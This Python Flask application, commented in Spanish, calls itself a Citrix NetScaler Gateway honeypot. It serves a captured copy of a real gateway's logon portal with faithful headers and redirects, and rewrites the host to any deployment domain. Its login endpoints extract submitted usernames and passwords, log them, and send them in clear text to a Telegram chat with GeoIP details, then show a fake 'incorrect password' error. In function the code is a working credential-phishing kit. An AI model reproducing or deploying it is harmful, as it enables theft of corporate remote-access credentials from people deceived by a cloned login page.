#!/usr/bin/env python3
"""
app.py — honeypot de NetScaler Gateway / Citrix Gateway (estático, sin proxy).

Sirve la copia de static_cache/ replicando la estructura de URLs, los códigos
de estado y las cabeceras del NetScaler original, y captura credenciales en
honeypot.log (y creds.log).

El host del que se capturó la copia se lee de static_cache/_meta.json y se
reescribe al host de cada petición, así que el honeypot es agnóstico de marca:
se ve igual que un Citrix Gateway cualquiera, en cualquier dominio.
"""
import os, re, json, mimetypes, logging, urllib.request, urllib.parse
from pathlib import Path
from datetime import datetime, timezone
from email.utils import formatdate
from flask import Flask, request, Response, g

# ─── Config ──────────────────────────────────────────────────────────────────
BASE_DIR    = Path(__file__).parent
STATIC_DIR  = BASE_DIR / "static_cache"
# Dónde se escriben las capturas. En un servidor es la propia carpeta; en
# plataformas sin disco (Vercel) hay que apuntar a /tmp con HONEYPOT_DATA_DIR.
DATA_DIR    = Path(os.environ.get("HONEYPOT_DATA_DIR") or BASE_DIR)
LOG_FILE    = DATA_DIR / "honeypot.log"
CREDS_FILE  = DATA_DIR / "creds.log"          # solo CREDENTIAL_CAPTURE events
LOG_LEVEL   = os.environ.get("LOG_LEVEL", "INFO")

# Página de logon a la que el NetScaler real manda todo lo demás.
LOGON_PAGE  = "/logon/LogonPoint/tmindex.html"
# Ruta intermedia del vhost de VPN (el real redirige /  →  /vpn/index.html  →
# tmindex.html; nosotros conservamos los dos saltos para no delatarnos).
VPN_INDEX   = "/vpn/index.html"

# Página 404 del Apache que hay delante del NetScaler real (la misma que se
# capturó en static_cache/logon/LogonPoint/login.htm; esto es sólo el respaldo
# por si la captura no la trae).
APACHE_404 = (
    '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"'
    ' "http://www.w3.org/TR/html4/strict.dtd">\n'
    "<html><head>\n"
    "<title>404 Not Found</title>\n"
    "</head><body>\n"
    "<h1>Not Found</h1>\n"
    "<p>The requested URL was not found on this server.</p>\n"
    "</body></html>\n"
)

# GeoIP: usa ip-api.com (gratis, sin key, máx 45 req/min)
GEOIP_ENABLED = os.environ.get("GEOIP_ENABLED", "1") == "1"

# Headers que devuelve NS real (faked)
FAKE_SERVER_HEADERS = {
    "Server":         "Apache",
    "X-Frame-Options":"SAMEORIGIN",
}

# Nombres de campos de credenciales (regex match sobre form keys)
CRED_USER_FIELDS = re.compile(r"user(name)?|login|email", re.I)
CRED_PASS_FIELDS = re.compile(r"pass(word)?|pwd|secret", re.I)

# Endpoints de captura de credenciales (POST)
CRED_ENDPOINTS = re.compile(
    r"/(cgi/login|vpns/cgi/login|nf/auth/doAuthenticate\.do|auth/login)", re.I
)

# ─── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("honeypot")


# ─── GeoIP lookup (async, non-blocking) ──────────────────────────────────────
_geoip_cache: dict = {}

def _geoip(ip: str) -> dict:
    """Devuelve dict con country/city/org para una IP. Cachea resultados."""
    if not GEOIP_ENABLED or not ip or ip in ("127.0.0.1", "::1"):
        return {}
    if ip in _geoip_cache:
        return _geoip_cache[ip]
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,isp,org,as,query"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4) as r:
            data = json.loads(r.read().decode())
        if data.get("status") == "success":
            result = {k: data[k] for k in ("country","countryCode","city","isp","org","as") if k in data}
            _geoip_cache[ip] = result
            return result
    except Exception:
        pass
    return {}


# ─── Telegram notificación ────────────────────────────────────────────────────
def _tg_config():
    """
    Credenciales del bot. Se usan los nombres de ShellGuard y se aceptan los
    cortos (TG_TOKEN/TG_CHAT_ID/TG_TOPIC_ID) como alias.
    """
    token = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TG_TOKEN", "")
    chat  = os.environ.get("TELEGRAM_CHAT_ID") or os.environ.get("TG_CHAT_ID", "")
    topic = os.environ.get("TELEGRAM_TOPIC_ID") or os.environ.get("TG_TOPIC_ID", "")
    return token, chat, topic


def _tg_notify(text: str):
    """
    Manda el aviso a un grupo (y a un topic concreto, si se indica).

    Mismo formato que ShellGuard: `sendMessage` con `chat_id`, `text` y
    `message_thread_id` cuando el grupo es de tipo foro. Va síncrono a
    propósito: en serverless (Vercel) un hilo en segundo plano puede morir
    cuando termina la respuesta, y perder una captura es lo peor que le puede
    pasar a un honeypot.
    """
    token, chat, topic = _tg_config()
    if not token or not chat:
        return
    try:
        payload = {
            "chat_id": chat,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        if topic:
            # El id del topic es el número que sale en el enlace del mensaje
            # dentro del grupo (t.me/c/<grupo>/<topic>).
            payload["message_thread_id"] = int(topic) if topic.lstrip("-").isdigit() else topic
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read().decode())
        if not data.get("ok"):
            log.warning(f"[TG] Telegram rechazó el mensaje: {data.get('description')}")
    except Exception as e:
        log.warning(f"[TG] Error notificando: {e}")


# ─── Log utils ────────────────────────────────────────────────────────────────
def _append_line(path: Path, line: str) -> None:
    """Escribe una línea sin que un fallo de disco tumbe la respuesta.

    En plataformas con el sistema de ficheros de sólo lectura (Vercel) esto se
    lleva a /tmp con HONEYPOT_DATA_DIR; si aun así no se puede escribir, se
    avisa por stderr y la petición sigue.
    """
    try:
        with open(path, "a") as f:
            f.write(line + "\n")
    except OSError as e:
        log.warning(f"[log] no se pudo escribir {path}: {e}")


def _log_event(event: str, extra: dict = None):
    entry = {
        "ts":    datetime.now(timezone.utc).isoformat(),
        "event": event,
    }
    if extra:
        entry.update(extra)
    line = json.dumps(entry, ensure_ascii=False)
    log.info(line)
    _append_line(LOG_FILE, line)
    # Escribir también en creds.log si es captura de credenciales
    if event == "CREDENTIAL_CAPTURE":
        _append_line(CREDS_FILE, line)


# ─── Flask app ────────────────────────────────────────────────────────────────
app = Flask(__name__, static_folder=None)
app.config["PROPAGATE_EXCEPTIONS"] = True


# ─── WSGI middleware: Server/Date con la pinta del Apache del original ───────
class ServerHeaderMiddleware:
    """
    Deja la respuesta con `Server: Apache` y `Date`, como el Apache que hay
    delante del NetScaler real.

    El servidor que nos escucha también escribe sus propias cabeceras `Server`
    (y `Date`), así que hay que apagárselas: en run.sh se arranca uvicorn con
    `--no-server-header --no-date-header`.
    """

    def __init__(self, wsgi_app):
        self.app = wsgi_app

    def __call__(self, environ, start_response):
        def patched_start_response(status, headers, exc_info=None):
            headers = [
                (k, v) for k, v in headers
                if k.lower() not in ("server", "date", "x-powered-by")
            ]
            headers.append(("Server", "Apache"))
            headers.append(("Date", formatdate(usegmt=True)))
            return start_response(status, headers, exc_info)
        return self.app(environ, patched_start_response)


app.wsgi_app = ServerHeaderMiddleware(app.wsgi_app)


# ─── Helpers ──────────────────────────────────────────────────────────────────
HOST_PLACEHOLDER = "{{HOST}}"


def _rewrite_hosts(text: str) -> str:
    """
    Sustituye el marcador de host por el de la petición.

    Al capturar, download.py cambia el host original por `{{HOST}}` en todo el
    contenido textual; aquí vuelve a su sitio con el host real de cada visita.
    Así la copia no lleva la identidad de ningún cliente: es un Citrix Gateway
    normal, sirviendo en el dominio donde esté desplegado.
    """
    if HOST_PLACEHOLDER not in text:
        return text
    return text.replace(HOST_PLACEHOLDER, request.host)


def _maybe_rewrite(raw: bytes, ctype: str) -> bytes:
    """Aplica la reescritura de host sólo a contenido textual."""
    if not re.match(r"^(text/|application/(json|xml|javascript))", ctype or "", re.I):
        return raw
    try:
        return _rewrite_hosts(raw.decode("utf-8")).encode("utf-8")
    except UnicodeDecodeError:
        return raw


def _abs_url(path: str) -> str:
    """URL absoluta para un path, respetando X-Forwarded-Proto detrás de proxy."""
    proto = request.headers.get("X-Forwarded-Proto", request.scheme).split(",")[0].strip()
    return f"{proto}://{request.host}{path}"


_meta_cache: list = []


def _meta() -> dict:
    """Cabeceras/estados grabados durante la captura (static_cache/_meta.json)."""
    if not _meta_cache:
        try:
            _meta_cache.append(json.loads((STATIC_DIR / "_meta.json").read_text()))
        except Exception:
            _meta_cache.append({})
    return _meta_cache[0]


# Cabeceras que nunca se reenvían: las pone el servidor que sirve, no el original.
_SKIP_HEADERS = {
    "content-length", "transfer-encoding", "connection", "keep-alive",
    "date", "server", "set-cookie", "etag", "last-modified", "accept-ranges",
    "age", "via",
}


def _captured_headers(key: str) -> dict:
    """Cabeceras reales que el NetScaler devolvió para ese recurso."""
    raw = (_meta().get(key) or {}).get("headers") or {}
    out = {}
    for k, v in raw.items():
        if k.lower() in _SKIP_HEADERS:
            continue
        out[k] = _rewrite_hosts(v) if isinstance(v, str) else v
    return out


def _redirect(location: str) -> Response:
    resp = Response("", status=302)
    resp.headers["Location"] = location
    for k, v in FAKE_SERVER_HEADERS.items():
        resp.headers[k] = v
    return resp


def _not_found() -> Response:
    """404 idéntico al Apache que sirve el NetScaler real."""
    # Si la captura incluyó una página 404 real, se usa tal cual.
    for rel in ("logon/LogonPoint/login.htm", "logon/LogonPoint/receiver.html"):
        p = STATIC_DIR / rel
        if p.is_file():
            resp = Response(p.read_bytes(), status=404,
                            content_type="text/html; charset=iso-8859-1")
            break
    else:
        resp = Response(APACHE_404, status=404,
                        content_type="text/html; charset=iso-8859-1")
    for k, v in FAKE_SERVER_HEADERS.items():
        resp.headers[k] = v
    return resp


def _static_path(url_path: str) -> Path:
    """
    Resuelve url_path a un archivo en static_cache/.
    Intenta rutas alternativas conocidas cuando no hay match exacto.
    """
    # normalizar: quitar query string y fragmento
    clean = url_path.split("?")[0].split("#")[0].lstrip("/")

    candidates = [
        STATIC_DIR / clean,
        STATIC_DIR / clean / "index.html",
    ]

    # El HTML principal está guardado bajo múltiples keys —
    # si algo parece ser una "login page" devolver tmindex.html
    login_aliases = {
        "cgi/login":                       "vpns/cgi/login_redirect.html",
        "vpns/cgi/login":                  "vpns/cgi/login_redirect.html",
        "vpn/index.html":                  "logon/LogonPoint/tmindex.html",
        "logon/logonpoint/tmindex.html":   "logon/LogonPoint/tmindex.html",
    }
    lower = clean.lower()
    if lower in login_aliases:
        candidates.insert(0, STATIC_DIR / login_aliases[lower])

    for p in candidates:
        # Resolver ".." en rutas CSS (e.g. receiver/css/../images/...)
        try:
            resolved = p.resolve()
            if str(resolved).startswith(str(STATIC_DIR.resolve())) and resolved.is_file():
                return resolved
        except Exception:
            pass
    return None


def _serve_static(path: str, extra_headers: dict = None,
                  fallback_login: bool = False) -> Response:
    """
    Sirve un archivo del static_cache.

    Devuelve None si no existe (el llamante decide si eso es un 404 o una
    redirección al login). `fallback_login=True` conserva el comportamiento
    antiguo de devolver la página de logon para cualquier ruta.
    """
    fpath = _static_path(path)
    if fpath is None or not fpath.is_file():
        if not fallback_login:
            return None
        fpath = STATIC_DIR / "logon" / "LogonPoint" / "tmindex.html"
        if not fpath.is_file():
            return None

    raw = fpath.read_bytes()
    ctype, _ = mimetypes.guess_type(str(fpath))
    if ctype is None:
        # heurístico por contenido
        if raw.startswith(b"<?xml") or raw.startswith(b"<Status>"):
            ctype = "application/xml"
        elif raw.startswith(b"{"):
            ctype = "application/json"
        else:
            ctype = "application/octet-stream"

    resp = Response(_maybe_rewrite(raw, ctype), status=200, content_type=ctype)
    # Cabeceras reales del recurso, tal y como las devolvió el NetScaler.
    for k, v in _captured_headers(path.lstrip("/")).items():
        resp.headers[k] = v
    for k, v in FAKE_SERVER_HEADERS.items():
        resp.headers[k] = v
    if extra_headers:
        for k, v in extra_headers.items():
            resp.headers[k] = v
    return resp


def _capture_credentials():
    """Extrae y loguea credenciales del POST body, con GeoIP y notificación Telegram."""
    username = password = None
    extra_fields = {}
    ct = request.content_type or ""

    if "application/x-www-form-urlencoded" in ct or "multipart/form-data" in ct:
        for key, val in request.form.items():
            if CRED_USER_FIELDS.search(key):
                username = val
            elif CRED_PASS_FIELDS.search(key):
                password = val
            else:
                extra_fields[key] = val
    elif "application/json" in ct:
        try:
            data = request.get_json(force=True, silent=True) or {}
            for key, val in data.items():
                if CRED_USER_FIELDS.search(key):
                    username = val
                elif CRED_PASS_FIELDS.search(key):
                    password = val
                else:
                    extra_fields[key] = str(val)
        except Exception:
            pass

    if username or password:
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
        ua = request.headers.get("User-Agent", "")
        geo = _geoip(ip)

        event_data = {
            "path":         request.path,
            "ip":           ip,
            "ua":           ua,
            "referer":      request.headers.get("Referer", ""),
            "username":     username,
            "password":     password,
            "extra_fields": extra_fields,
            "raw_body":     request.get_data(as_text=True)[:512],
            "content_type": ct,
            "geo":          geo,
        }
        _log_event("CREDENTIAL_CAPTURE", event_data)

        # Notificación Telegram en tiempo real
        geo_str = ""
        if geo:
            geo_str = f"\n🌍 <b>Geo:</b> {geo.get('city','?')}, {geo.get('country','?')} ({geo.get('countryCode','?')})"
            if geo.get("org"):
                geo_str += f"\n🏢 <b>Org:</b> {geo['org']}"

        tg_msg = (
            f"🎣 <b>CREDENTIAL CAPTURED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>User:</b> <code>{username or '?'}</code>\n"
            f"🔑 <b>Pass:</b> <code>{password or '?'}</code>\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>{geo_str}\n"
            f"🖥 <b>UA:</b> <code>{ua[:80]}</code>\n"
            f"📍 <b>Path:</b> <code>{request.path}</code>\n"
            f"🕐 <b>TS:</b> {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC"
        )
        _tg_notify(tg_msg)

    return username, password


# ─── Before/after request ─────────────────────────────────────────────────────
@app.before_request
def _log_request():
    _log_event("request", {
        "method":  request.method,
        "path":    request.path,
        "query":   request.query_string.decode("utf-8", errors="replace"),
        "ip":      request.remote_addr,
        "ua":      request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
    })


# ─── Routes ───────────────────────────────────────────────────────────────────

# ── Fingerprint: pluginlist.xml ───────────────────────────────────────────────
@app.route("/vpn/pluginlist.xml")
def vpn_pluginlist():
    return _serve_static("vpn/pluginlist.xml") or _not_found()


# ── nFactor: getECdetails ─────────────────────────────────────────────────────
@app.route("/nf/auth/getECdetails", methods=["GET", "POST"])
def nf_get_ec_details():
    resp = Response('{"encrypt": "DISABLED"}', status=200,
                    content_type="application/json; charset=utf-8")
    for k, v in FAKE_SERVER_HEADERS.items():
        resp.headers[k] = v
    return resp


# ── cgi/Resources/List (unauthorized → dispara flujo login) ──────────────────
# Challenge value que dispara el flujo de login en ctxs.core.min.js
# El JS busca la header "CitrixWebReceiver-Authenticate" en la response;
# si existe, publica el evento resources.challenged que muestra el form.
_NS_CHALLENGE = (
    'reason="notoken",'
    ' location="/cgi/GetAuthMethods"'
)

# Respuesta de /cgi/GetAuthMethods: la lista de métodos de logon disponibles.
# El JS de Receiver for Web la parsea buscando <method name="…" url="…">, y con
# la lista vacía enseña «No logon methods are available on this platform».
_AUTH_METHODS_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<authMethods><method name="ExplicitForms" '
    'url="/nf/auth/getAuthenticationRequirements.do"/></authMethods>'
)


@app.route("/cgi/Resources/List", methods=["GET", "POST", "HEAD"])
@app.route("/logon/LogonPoint/Resources/List", methods=["GET", "POST", "HEAD"])
def cgi_resources_list():
    # Copia capturada (mismo cuerpo y mismas cabeceras que el NetScaler real).
    resp = _serve_static("cgi/Resources/List")
    if resp is None:
        resp = Response('{"unauthorized": true}', status=200,
                        content_type="text/plain; charset=utf-8")
    # Este header es el que dispara el flujo de autenticación en el Receiver.
    resp.headers["CitrixWebReceiver-Authenticate"] = _NS_CHALLENGE
    resp.headers["X-Citrix-Application"] = "Receiver for Web"
    for k, v in FAKE_SERVER_HEADERS.items():
        resp.headers[k] = v
    return resp


# ── cgi/GetAuthMethods (métodos de logon disponibles) ─────────────────────────
@app.route("/cgi/GetAuthMethods", methods=["GET", "POST", "HEAD"])
def cgi_get_auth_methods():
    resp = _serve_static("cgi/GetAuthMethods")
    if resp is None:
        resp = Response(_AUTH_METHODS_XML, status=200,
                        content_type="application/vnd.citrix.authenticateresponse-1+xml; charset=utf-8")
    resp.headers["X-Citrix-Application"] = "Receiver for Web"
    for k, v in FAKE_SERVER_HEADERS.items():
        resp.headers[k] = v
    return resp


# ── nFactor: getAuthenticationRequirements ────────────────────────────────────
# Formato ReceiverWeb: lista de métodos de autenticación disponibles.
# El JS busca <method name="..."> para saber qué controlador arrancar.
# ExplicitForms → ctxsFormsAuthentication widget, que luego hace GET a su url
# para obtener el form HTML nFactor.
_AUTH_METHODS_XML = '''\
<?xml version="1.0" encoding="UTF-8"?>
<AuthenticationMethodsResponse>
  <AuthenticationMethod>
    <Name>ExplicitForms</Name>
    <RequiresPasswordChange>false</RequiresPasswordChange>
    <PasswordChangeURL>/nf/auth/doAuthentication.do</PasswordChangeURL>
  </AuthenticationMethod>
</AuthenticationMethodsResponse>'''

# XML nFactor completo: form con user/password + «Remember my credentials»
# (idéntico al que devuelve el NetScaler real; se usa como fallback si la
# captura no trae el fichero).
_NFACTOR_FORM_XML = '''\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\
<AuthenticateResponse xmlns="http://citrix.com/authentication/response/1">\
<Status>success</Status>\
<Result>more-info</Result>\
<StateContext>bG9naW5zY2hlbWE9ZGVmYXVsdA==</StateContext>\
<AuthenticationRequirements>\
<PostBack>/nf/auth/doAuthentication.do</PostBack>\
<CancelPostBack>/nf/auth/doLogoff.do</CancelPostBack>\
<CancelButtonText>Cancel</CancelButtonText>\
<Requirements>\
<Requirement><Credential><Type>none</Type></Credential>\
<Label><Type>nsg-login-heading</Type><Text>nsg_loginHeading</Text></Label></Requirement>\
<Requirement><Credential><ID>login</ID><SaveID>login</SaveID><Type>username</Type></Credential>\
<Label><Text>nsg_username</Text><Type>nsg-login-label</Type></Label>\
<Input><Text><ReadOnly>false</ReadOnly><InitialValue></InitialValue><Constraint>.+</Constraint></Text></Input></Requirement>\
<Requirement><Credential><ID>passwd</ID><SaveID>passwd</SaveID><Type>password</Type></Credential>\
<Label><Text>nsg_password1</Text><Type>nsg-login-label</Type></Label>\
<Input><Text><Secret>true</Secret><Constraint>.+</Constraint></Text></Input></Requirement>\
<Requirement><Credential><ID>savecredentials</ID><SaveID></SaveID><Type>savecredentials</Type></Credential>\
<Label><Text>Remember my credentials</Text><Type>plain</Type></Label>\
<Input><AssistiveText></AssistiveText><CheckBox><InitialValue>false</InitialValue></CheckBox></Input></Requirement>\
<Requirement><Credential><ID>nsg-x1-logon-button</ID><Type>none</Type></Credential>\
<Input><Button>Log On</Button></Input><Label><Type/></Label></Requirement>\
</Requirements>\
</AuthenticationRequirements>\
</AuthenticateResponse>'''


# Requirement extra que el NetScaler añade cuando las credenciales fallan: una
# etiqueta suelta de tipo «error», sin campo, que el widget pinta sobre el
# formulario. El Text es la clave del bundle de idioma del Receiver, no el
# literal («errorMessageLabel4444» → «Incorrect user name or password.»).
_NFACTOR_ERROR_XML = (
    "<Requirement><Credential><Type>none</Type></Credential>"
    "<Label><Type>error</Type><Text>errorMessageLabel4444</Text></Label>"
    "<Input/></Requirement>"
)


def _nfactor_form_xml(error: bool = False) -> str:
    """Formulario nFactor tal cual lo devuelve el NetScaler real (capturado)."""
    path = STATIC_DIR / "nf" / "auth" / "getAuthenticationRequirements.do"
    xml = ""
    if path.is_file():
        xml = path.read_text(encoding="utf-8", errors="replace")
    if not xml:
        xml = _NFACTOR_FORM_XML
    if error:
        # El error va justo detrás del encabezado «Please log on», como en el
        # NetScaler real.
        marker = "<Requirement><Credential><ID>login</ID>"
        if marker in xml:
            xml = xml.replace(marker, _NFACTOR_ERROR_XML + marker, 1)
        elif "</Requirements>" in xml:
            xml = xml.replace("</Requirements>", _NFACTOR_ERROR_XML + "</Requirements>", 1)
    return xml


def _xml_response(xml: str) -> Response:
    resp = Response(xml, status=200,
                    content_type="application/vnd.citrix.authenticateresponse-1+xml; charset=utf-8")
    for k, v in FAKE_SERVER_HEADERS.items():
        resp.headers[k] = v
    return resp


@app.route("/nf/auth/getAuthenticationRequirements.do", methods=["GET", "POST"])
def nf_auth_requirements():
    """
    ReceiverWeb pide aquí los requisitos de autenticación y recibe el formulario
    nFactor ya descrito (usuario, contraseña, «Remember my credentials»).

    Se sirve la respuesta capturada del NetScaler real, byte a byte.
    """
    resp = _serve_static("nf/auth/getAuthenticationRequirements.do")
    if resp is None:
        resp = Response(_NFACTOR_FORM_XML, status=200,
                        content_type="application/vnd.citrix.authenticateresponse-1+xml; charset=utf-8")
        for k, v in FAKE_SERVER_HEADERS.items():
            resp.headers[k] = v
    return resp


@app.route("/nf/auth/getAuthenticationForm.do", methods=["GET", "POST"])
def nf_auth_form():
    """
    ExplicitForms controller llama este endpoint para obtener el HTML del form.
    El ctxsFormsAuthentication widget renderiza el XML nFactor directamente.
    """
    return nf_auth_requirements()


# ── nFactor: doLogoff (POST → success) ───────────────────────────────────────
@app.route("/nf/auth/doLogoff.do", methods=["POST", "GET"])
def nf_auth_logoff():
    return _serve_static("nf/auth/doLogoff_response.xml") or _not_found()


# ── OIDC IDP ──────────────────────────────────────────────────────────────────
@app.route("/oauth/idp/.well-known/openid-configuration")
def oidc_config():
    # El emisor y los endpoints son los del NetScaler real; el host se reescribe
    # al de la petición en _maybe_rewrite.
    return _serve_static("oauth/idp/.well-known/openid-configuration.json") or _not_found()


# ── Legacy /vpns/cgi/login ────────────────────────────────────────────────────
@app.route("/vpns/cgi/login", methods=["GET", "POST"])
def vpns_cgi_login():
    if request.method == "POST":
        _capture_credentials()
    # Con y sin credenciales, el real manda a /vpn/index.html (que a su vez
    # manda a la página de logon). Mismo salto, misma pinta.
    return _redirect(VPN_INDEX)


# ── /cgi/login (alias) ────────────────────────────────────────────────────────
@app.route("/cgi/login", methods=["GET", "POST"])
def cgi_login():
    if request.method == "POST":
        _capture_credentials()
    return _redirect(VPN_INDEX)


# ── nFactor: doAuthenticate (captura + simula respuesta NS) ───────────────────
@app.route("/nf/auth/doAuthenticate.do", methods=["POST", "GET"])
@app.route("/nf/auth/doAuthentication.do", methods=["POST", "GET"])
def nf_auth_authenticate():
    if request.method == "POST":
        # Se intenta capturar siempre: el NetScaler real usa los campos
        # «login»/«passwd», pero un cliente que pruebe otras rutas puede mandar
        # cualquier nombre, y al honeypot le interesa lo que venga.
        username, _ = _capture_credentials()
        if not username:
            # POST sin credenciales = petición inicial del widget → form vacío.
            return _xml_response(_nfactor_form_xml())

        # El NetScaler real devuelve el formulario otra vez, con un Requirement
        # de tipo error. El texto es el que trae su propio bundle de idioma.
        return _xml_response(_nfactor_form_xml(error=True))

    # GET sin credenciales → devuelve el form con campos vacíos (igual que el real)
    return _xml_response(_nfactor_form_xml())


# ── Login pages principales ───────────────────────────────────────────────────
@app.route("/logon/LogonPoint/tmindex.html")
@app.route("/logon/LogonPoint/")
@app.route("/logon/LogonPoint")
def logon_main():
    return _serve_static("logon/LogonPoint/tmindex.html")


@app.route("/vpn/index.html")
@app.route("/vpn/")
def vpn_index():
    # El NetScaler real no sirve la página aquí: redirige a tmindex.html. Es la
    # diferencia que hace que las rutas relativas del Receiver for Web
    # (receiver/css/... , custom/style.css, Home/Configuration) resuelvan bien.
    return _redirect(LOGON_PAGE)


# ── Assets estáticos (/logon/LogonPoint/receiver/...) ────────────────────────
@app.route("/logon/LogonPoint/<path:subpath>", methods=["GET", "POST", "HEAD"])
def logon_assets(subpath):
    resp = _serve_static(f"logon/LogonPoint/{subpath}")
    # Bajo /logon/ el real es un árbol de ficheros: lo que no existe es 404.
    return resp if resp is not None else _not_found()


@app.route("/vpns/<path:subpath>")
def vpns_assets(subpath):
    return _redirect(VPN_INDEX)


# ── Catch-all: mismo reparto de rutas que el NetScaler real ───────────────────
@app.route("/", defaults={"path": ""}, methods=["GET", "HEAD", "OPTIONS"])
@app.route("/<path:path>",             methods=["GET", "HEAD", "OPTIONS"])
def catchall(path):
    # 1) Lo que tenemos capturado se sirve tal cual.
    resp = _serve_static(path)
    if resp is not None:
        return resp

    # 2) Bajo /logon/ y /vpn/ el real es Apache: 404, con su misma página.
    if path.startswith(("logon/", "vpn/")) or path == "favicon.ico":
        return _not_found()

    # 3) Cualquier otra ruta del vhost acaba en el portal VPN, y de ahí al
    #    logon. El real lo manda en absoluto.
    if path in ("", "."):
        return _redirect(LOGON_PAGE)
    return _redirect(_abs_url(VPN_INDEX))


# ─── Entry point ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    port = int(os.environ.get("PORT", 8443))
    debug = "--dev" in sys.argv
    log.info(f"Starting honeypot on :{port} (debug={debug})")
    log.info(f"Static cache: {STATIC_DIR} ({len(list(STATIC_DIR.rglob('*')))} items)")
    app.run(host="0.0.0.0", port=port, debug=debug, use_reloader=False)
